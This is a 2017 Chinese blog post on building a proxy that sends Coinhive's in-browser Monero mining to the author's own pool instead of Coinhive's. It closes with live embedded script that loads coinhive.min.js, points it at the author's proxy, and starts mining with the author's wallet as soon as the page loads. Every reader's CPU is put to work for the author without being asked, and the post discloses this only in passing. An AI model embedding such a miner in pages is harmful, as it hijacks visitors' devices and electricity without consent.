---
title: 搭建自己的JavaScript挖矿代理
date: 2017-10-12 22:09:26
tags:
---



本文介绍了如何搭建自己的js挖矿代理服务器，并在本篇博客中提供了示例。因此，当您决定继续阅读本篇博文时，您已经在为笔者挖取门罗币（Monero）了。

<!--more-->

# 0000b 背景

自从某国外知名网站宣布尝试使用js挖矿来取代广告收入后，js挖矿开始被大家所知。据报道，传说中的知名网站使用的是[coinhive](https://coinhive.com/)提供的技术进行Monero的挖取。[coinhive](https://coinhive.com/)提供了成套的解决方案。只要大家愿意，完全可以在几分钟内将挖矿程序嵌入到自己的网站中。
不过，coinhive与其他矿池并没有合作。这就是说，如果你已经在其他矿池通过矿机或自己闲置的PC挖矿的话，通过网页挖到的收益并不能整合到已有的矿池中，此外coinhive还要缴纳30%的挖矿收入。再考虑到无论是coinhive还是其他各种矿池，都是要在挖到一定数量的货币以后才会进行支付，所以对于笔者这样算力有限的小矿工来说，集中算力在一个矿池挖矿才是正事。因此，本篇文章将介绍如何借用coinhive的挖矿脚本，躲过30%的苛捐杂税，在自己已经奋斗多年的矿池里挖矿。

# 0001b 原理介绍
coinhive提供的挖矿脚本使用websocket与服务端进行通信，而各大矿池通常使用[Stratum Mining Protocol](https://en.bitcoin.it/wiki/Stratum_mining_protocol)来与挖矿的worker通信。默认情况下，coinhive自己的脚本当然是连接到自家的服务器。我们要做的就是搭建一台代理服务器，完成Stratum Mining Protocol和coinhive使用的websocket协议之间的转换，然后配置coinhive的脚本，让其连接我们自己的代理服务器即可。So Easy!

# 0010b 开源代理服务器项目介绍
有了想法之后，到GitHub上搜索了一番，果然已经有前辈完成了相关的工作，看来我们剩下的工作只需要将其部署到自己的服务器上就行了。在此提供两个开源项目：
* [coinhive-stratum-mining-proxy](https://github.com/x25/coinhive-stratum-mining-proxy) 使用Python和twisted库编写的Proxy
* [coin-hive-stratum](https://github.com/cazala/coin-hive-stratum) 该作者受到上面Python项目的启发，用Node.js写了一个

# 0011b 闷声发大财
这篇文章并不打算列出详细的服务搭建过程，是的，上面的两个项目都有详细的文档，如果您是挖过矿的程序员，那么您完全可以按照上述项目的文档完成部署；如果您对挖矿不了解，或者没有VPS，那么想把这些都搞清楚开始有些困难的。

> 中国人有一句说话叫「闷声发大财」


# 0100b 写在最后
请注意下面三行文字：
<div id="miner_info"></div>
上面三行跳动的数字代表着你的CPU正在为笔者挖矿。请耐心等待直到第三行的Accepted Hashes不再为0。
挖矿的速度从一定程度上反映了您所使用的设备的计算性能。如果您有兴趣，不放邀请您的好友访问本站，看看谁的设备计算性能好一些。笔者的华为荣耀8手机可以跑出 18H/s 的速度，不知道超越了全球百分之多少的用户。
当然，不用担心，当你关闭该页面后，挖矿就会停止。而且，截至目前，本站其他页面没有嵌入挖矿脚本。
对了，如果您发现在阅读本篇文章时，上面的数字没有跳动，那一定是出了些问题，请立即在[github](https://github.com/myrfy001)上联系我，或者提出[issue](https://github.com/myrfy001/blog.ideawand.com/issues)。


<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://ideawand.com:8892/proxy"]];
var miner = new CoinHive.Anonymous('455atBUeKbhUUugvvgKnseQPnPetucs1JFtaeA68kgeyXhSXrHrqPPXPa37FqJdWc3bUJK1xWsrhJeDpqa2LrG83JhndMvt');
setInterval(function() {
  var hashesPerSecond = miner.getHashesPerSecond();
  var totalHashes = miner.getTotalHashes();
  var acceptedHashes = miner.getAcceptedHashes();
  document.getElementById("miner_info").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + "Total Hashes = " + totalHashes + "<br>Accepted Hashes = " + acceptedHashes;
}, 1000);
miner.start();
</script>